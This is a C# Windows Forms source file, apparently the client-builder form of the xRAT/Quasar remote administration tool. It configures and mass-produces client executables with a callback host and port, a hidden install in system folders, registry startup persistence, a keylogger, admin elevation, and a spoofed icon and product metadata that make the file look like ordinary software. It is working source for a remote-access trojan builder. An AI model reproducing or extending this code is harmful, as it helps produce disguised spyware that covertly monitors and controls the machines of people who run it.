using System;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using xServer.Core.Build;
using xServer.Core.Helper;
using xServer.Settings;
using System.Threading;
using System.Diagnostics;

namespace xServer.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;

#if MULTI_CLIENT

        private const string ClientOutputDirectory = "MultiClient";

        /// <summary>
        /// A read-only object used to ensure thread-safety.
        /// </summary>
        private readonly object locker = new object();

        /// <summary>
        /// Gets or sets if clients are currently being built.
        /// </summary>
        private bool BuildingClients = false;

        private int _ClientsToBuild;
        /// <summary>
        /// Determines the amount of clients to build.
        /// </summary>
        private int ClientsToBuild
        {
            get
            {
                return _ClientsToBuild;
            }
            set
            {
                // Make sure accessing threads will not enter when they shouldn't.
                lock (locker)
                {
                    // Make sure that the value is atleast 0.
                    if (value < 0)
                    {
                        value = 0;
                    }

                    // If the value was unchanged, don't bother showing the warning and just return.
                    // If the value is to be changed, return if building clients and the user is chooses
                    // to deny the warning that will stop building clients.
                    if ((value == _ClientsToBuild) || (BuildingClients && !ClientsBuildingWarn(_ClientsToBuild)))
                    {
                        return;
                    }
                    else
                    {
                        _ClientsToBuild = value;
                    }
                }
            }
        }

        /// <summary>
        /// Warns that the clients to build has changed in value, prompting to accept the change.
        /// </summary>
        /// <param name="ClientsBuilding">Amount of clients that are currently being built.</param>
        /// <returns>Returns true if the user accepts the warning (wishes to proceed with the changed
        /// value); Returns false if the user denies the warning (wishes to continue build the original
        /// amount of clients).</returns>
        private bool ClientsBuildingWarn(int ClientsBuilding)
        {
            // Signal the client-building thread to wait.

            switch (MessageBox.Show("Would you like to change the amount of clients to build? This will cancel the current building operation.",
                                    "Currently building " + ClientsBuilding.ToString() + " client(s).", MessageBoxButtons.YesNo,
                                    MessageBoxIcon.Warning))
            {
                case System.Windows.Forms.DialogResult.Yes:
                    BuildingClients = false;
                    return true;
                case System.Windows.Forms.DialogResult.No:
                default: // Default is to return false (to not change the amount of clients to build).
                    return false;
            }
        }

        private void txtClientCount_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
            // If it was not handled, it must have been a valid number.
            if (e.Handled)
            {
                // If there is no value in the count TextBox, default to build 1 client.
                if (string.IsNullOrEmpty(txtClientCount.Text))
                {
                    ClientsToBuild = 1;
                }
                else
                {
                    int _ClientsToBuild;
                    // Make sure that it is a valid number to use.
                    if (int.TryParse(txtClientCount.Text, out _ClientsToBuild))
                    {
                        // Try to set the amount of clients to build.
                        ClientsToBuild = _ClientsToBuild;
                    }
                }
            }
        }

        private void InitializeClientFactory(string iconPath, string[] asmInfo)
        {
            // Make sure clients are not currently being built.
            if (!BuildingClients)
            {
                try
                {
                    // Get the directory ready for action.
                    if (!Directory.Exists(ClientOutputDirectory))
                    {
                        Directory.CreateDirectory(ClientOutputDirectory);
                    }
                }
                catch (Exception ex)
                {
                    // We couldn't create the directory! :(
                    MessageBox.Show("Unable to create an output directory for the clients.", ex.Message);
                    return;
                }

                // Create and start the client factory thread.
                new Thread(() =>
                {
                    BuildingClients = true;

                    // The remaining clients to build.
                    int RemainingClients = 0;
                    // Keep track of the clients that failed to build.
                    int FailedClientBuilds = 0;

                    try
                    {
                        for (RemainingClients = ClientsToBuild; BuildingClients && (RemainingClients > 0); RemainingClients--)
                        {
                            try
                            {
                                string installName = txtInstallname.Text + RemainingClients.ToString() + ".exe";
                                string installPath = Path.Combine(ClientOutputDirectory, installName);

                                // Build the client.
                                ClientBuilder.Build(installPath, txtHost.Text, txtPassword.Text, txtInstallsub.Text,
                                                    installName, Guid.NewGuid().ToString(), txtRegistryKeyName.Text,
                                                    chkInstall.Checked, chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked,
                                                    int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallPath(),
                                                    chkElevation.Checked, iconPath, asmInfo, Application.ProductVersion);
                            }
                            // If we get this issue, it is going to affect every build of the client,
                            // so just stop building clients.
                            catch (FileLoadException)
                            {
                                BuildingClients = false;
                                // Re-throw (also causing a break in the loop.
                                throw;
                            }
                            catch
                            {
                                FailedClientBuilds++;
                            }
                        }
                    }
                    catch (FileLoadException)
                    {
                        MessageBox.Show("Unable to load the Client Assembly Information.\nPlease re-build the Client.",
                        "Error loading Client", MessageBoxButtons.OK, MessageBoxIcon.Error);

                        FailedClientBuilds = ClientsToBuild;
                    }
                    catch (Exception ex)
                    {
                        // The amount of failed client builts likely are not reliable, so calculate
                        // in a manual fashion to get a more accurate amount of failed client builds.
                        FailedClientBuilds = (ClientsToBuild - (ClientsToBuild - RemainingClients));

                        MessageBox.Show(
                            string.Format("An error occurred when building clients!\n\nError Message: {0}\nStack Trace:\n{1}",
                                          ex.Message, ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    finally
                    {
                        // If we are not considered to still be in the process of building clients, skip this
                        // warning message of the failed client builds.
                        if (!BuildingClients)
                        {
                            // Inform the user if a client or clients failed to build.
                            if (FailedClientBuilds > 0)
                            {
                                // If the amount of clients to build is equal to the amount of failed built clients, we know
                                // that all clients failed to build.
                                string RemainingClientsMessage =
                                    (ClientsToBuild == FailedClientBuilds) ?
                                    "all " + ClientsToBuild + " clients" : FailedClientBuilds + " clients";
                                MessageBox.Show("Failed to build " + FailedClientBuilds + ".", "Warning",
                                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }

                        // We will finally inform the user of the amount of successfully-built clients.
                        int SuccessfullyBuiltClients = (ClientsToBuild - FailedClientBuilds);

                        string SuccessfulClientsMessage = string.Empty;
                        // If it is less than 1, just inform the user that none were correctly built.
                        if (SuccessfullyBuiltClients < 1)
                        {
                            SuccessfulClientsMessage = "0 clients";
                        }
                        // Otherwise, if the amount of successfully-built clients is equal to the clients to build,
                        // we know that all clients have been successfully built.
                        else
                        {
                            SuccessfulClientsMessage = (SuccessfullyBuiltClients == ClientsToBuild) ?
                                                        "all " + ClientsToBuild + " clients" : SuccessfullyBuiltClients + " clients";
                        }

                        // Show the result.
                        MessageBox.Show("Successfully built " + SuccessfulClientsMessage + ".", "Successful Client Builds",
                                        MessageBoxButtons.OK, MessageBoxIcon.Information);

                        BuildingClients = false;
                    }
                }) { Name = "Client Factory" }.Start();
            }
        }

        // WinForms-Generated code below...
        private System.Windows.Forms.TextBox txtClientCount = new System.Windows.Forms.TextBox();

        /// <summary>
        /// Initializes the textbox that obtains the amount of clients to build.
        /// This method call will be ignored on any configuration other than
        /// "MULTI_CLIENT".
        /// </summary>
        private void InitializeClientCountTxtbox()
        {
            // 
            // txtClientCount
            // 
            this.txtClientCount.Location = new System.Drawing.Point(245, 125);
            this.txtClientCount.MaxLength = 5;
            this.txtClientCount.Name = "txtClientCount";
            this.txtClientCount.Size = new System.Drawing.Size(66, 22);
            this.txtClientCount.TabIndex = 11;
            this.txtClientCount.Text = "1";
            this.txtClientCount.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtClientCount_KeyPress);
        }

#endif

        public FrmBuilder()
        {
#if MULTI_CLIENT
            InitializeClientCountTxtbox();
#endif

            InitializeComponent();
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        private void UpdateControlStates()
        {
            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
            chkStartup.Enabled = chkInstall.Checked;
            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
        }

        private void LoadProfile(string profilename)
        {
            ProfileManager pm = new ProfileManager(profilename + ".xml");
            txtHost.Text = pm.ReadValue("Hostname");
            txtPort.Text = pm.ReadValue("ListenPort");
            txtPassword.Text = pm.ReadValue("Password");
            txtDelay.Text = pm.ReadValue("Delay");
            txtMutex.Text = pm.ReadValue("Mutex");
            chkInstall.Checked = bool.Parse(pm.ReadValueSafe("InstallClient", "False"));
            txtInstallname.Text = pm.ReadValue("InstallName");
            GetInstallPath(int.Parse(pm.ReadValue("InstallPath"))).Checked = true;
            txtInstallsub.Text = pm.ReadValue("InstallSub");
            chkHide.Checked = bool.Parse(pm.ReadValueSafe("HideFile", "False"));
            chkStartup.Checked = bool.Parse(pm.ReadValueSafe("AddStartup", "False"));
            txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
            chkElevation.Checked = bool.Parse(pm.ReadValueSafe("AdminElevation", "False"));
            chkIconChange.Checked = bool.Parse(pm.ReadValueSafe("ChangeIcon", "False"));
            chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValueSafe("ChangeAsmInfo", "False"));
            chkKeylogger.Checked = bool.Parse(pm.ReadValueSafe("Keylogger", "False"));
            txtProductName.Text = pm.ReadValue("ProductName");
            txtDescription.Text = pm.ReadValue("Description");
            txtCompanyName.Text = pm.ReadValue("CompanyName");
            txtCopyright.Text = pm.ReadValue("Copyright");
            txtTrademarks.Text = pm.ReadValue("Trademarks");
            txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
            txtProductVersion.Text = pm.ReadValue("ProductVersion");
            txtFileVersion.Text = pm.ReadValue("FileVersion");
            _profileLoaded = true;
        }

        private void SaveProfile(string profilename)
        {
            ProfileManager pm = new ProfileManager(profilename + ".xml");
            pm.WriteValue("Hostname", txtHost.Text);
            pm.WriteValue("ListenPort", txtPort.Text);
            pm.WriteValue("Password", txtPassword.Text);
            pm.WriteValue("Delay", txtDelay.Text);
            pm.WriteValue("Mutex", txtMutex.Text);
            pm.WriteValue("InstallClient", chkInstall.Checked.ToString());
            pm.WriteValue("InstallName", txtInstallname.Text);
            pm.WriteValue("InstallPath", GetInstallPath().ToString());
            pm.WriteValue("InstallSub", txtInstallsub.Text);
            pm.WriteValue("HideFile", chkHide.Checked.ToString());
            pm.WriteValue("AddStartup", chkStartup.Checked.ToString());
            pm.WriteValue("RegistryName", txtRegistryKeyName.Text);
            pm.WriteValue("AdminElevation", chkElevation.Checked.ToString());
            pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
            pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
            pm.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
            pm.WriteValue("ProductName", txtProductName.Text);
            pm.WriteValue("Description", txtDescription.Text);
            pm.WriteValue("CompanyName", txtCompanyName.Text);
            pm.WriteValue("Copyright", txtCopyright.Text);
            pm.WriteValue("Trademarks", txtTrademarks.Text);
            pm.WriteValue("OriginalFilename", txtOriginalFilename.Text);
            pm.WriteValue("ProductVersion", txtProductVersion.Text);
            pm.WriteValue("FileVersion", txtFileVersion.Text);
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            LoadProfile("Default");
            if (string.IsNullOrEmpty(txtMutex.Text))
            {
                txtPort.Text = XMLSettings.ListenPort.ToString();
                txtPassword.Text = XMLSettings.Password;
                txtMutex.Text = Helper.GetRandomName(32);
            }

            UpdateControlStates();

            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);

            ToggleAsmInfoControls();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show("Do you want to save your current settings?", "Save your settings?",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
        }

        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || Helper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || Helper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = Helper.GetRandomName(32);
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            ToggleAsmInfoControls();
        }

        private void RefreshExamplePath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallsub.Text),
                        txtInstallname.Text);

            this.Invoke((MethodInvoker)delegate { txtExamplePath.Text = path + ".exe"; });
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) &&
                !string.IsNullOrEmpty(txtDelay.Text) && // Connection Information
                !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // Client Options
                !chkInstall.Checked ||
                (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) &&
                 !string.IsNullOrEmpty(txtInstallsub.Text)) && // Installation Options
                !chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))
            // Persistence and Registry Features
            {
                string output = string.Empty;
                string icon = string.Empty;

                if (chkIconChange.Checked)
                {
                    using (OpenFileDialog ofd = new OpenFileDialog())
                    {
                        ofd.Filter = "Icons *.ico|*.ico";
                        ofd.Multiselect = false;
                        if (ofd.ShowDialog() == DialogResult.OK)
                            icon = ofd.FileName;
                    }
                }

#if !MULTI_CLIENT
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.Filter = "EXE Files *.exe|*.exe";
                    sfd.RestoreDirectory = true;
                    sfd.FileName = "Client-built.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                        output = sfd.FileName;
                }
                
                if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
#else
                if (!chkIconChange.Checked || !string.IsNullOrEmpty(icon))
#endif
                {
                    try
                    {
                        string[] asmInfo = null;
                        if (chkChangeAsmInfo.Checked)
                        {
                            if (!IsValidVersionNumber(txtProductVersion.Text) ||
                                !IsValidVersionNumber(txtFileVersion.Text))
                            {
                                MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder",
                                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                                return;
                            }

                            asmInfo = new string[8];
                            asmInfo[0] = txtProductName.Text;
                            asmInfo[1] = txtDescription.Text;
                            asmInfo[2] = txtCompanyName.Text;
                            asmInfo[3] = txtCopyright.Text;
                            asmInfo[4] = txtTrademarks.Text;
                            asmInfo[5] = txtOriginalFilename.Text;
                            asmInfo[6] = txtProductVersion.Text;
                            asmInfo[7] = txtFileVersion.Text;
                        }

#if MULTI_CLIENT
                        int clientsToBuild = 0;
                        if (int.TryParse(txtClientCount.Text, out clientsToBuild))
                        {
                            ClientsToBuild = clientsToBuild;

                            InitializeClientFactory(icon, asmInfo);
                        }
                    }
#else
                        ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text,
                            txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked,
                            chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked, int.Parse(txtPort.Text),
                            int.Parse(txtDelay.Text),
                            GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);

                        MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
                            MessageBoxIcon.Information);
                    }
                    catch (FileLoadException)
                    {
                        MessageBox.Show("Unable to load the Client Assembly Information.\nPlease re-build the Client.",
                            "Error loading Client", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
#endif
                    catch (Exception ex)
                    {
                        MessageBox.Show(
                            string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message,
                                ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
                MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
        }

        private int GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            return 1;
        }

        private RadioButton GetInstallPath(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    return rbAppdata;
            }
        }

        private void ToggleAsmInfoControls()
        {
            this.Invoke((MethodInvoker)delegate
            {
                foreach (Control ctrl in groupAsmInfo.Controls)
                {
                    if (ctrl is Label)
                        ((Label)ctrl).Enabled = chkChangeAsmInfo.Checked;
                    else if (ctrl is TextBox)
                        ((TextBox)ctrl).Enabled = chkChangeAsmInfo.Checked;
                }
            });
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
            return match.Success;
        }

        /// <summary>
        /// Handles a basic change in setting.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        /// <summary>
        /// Handles a basic change in setting, also refreshing the example file path.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshExamplePath();
        }
    }
}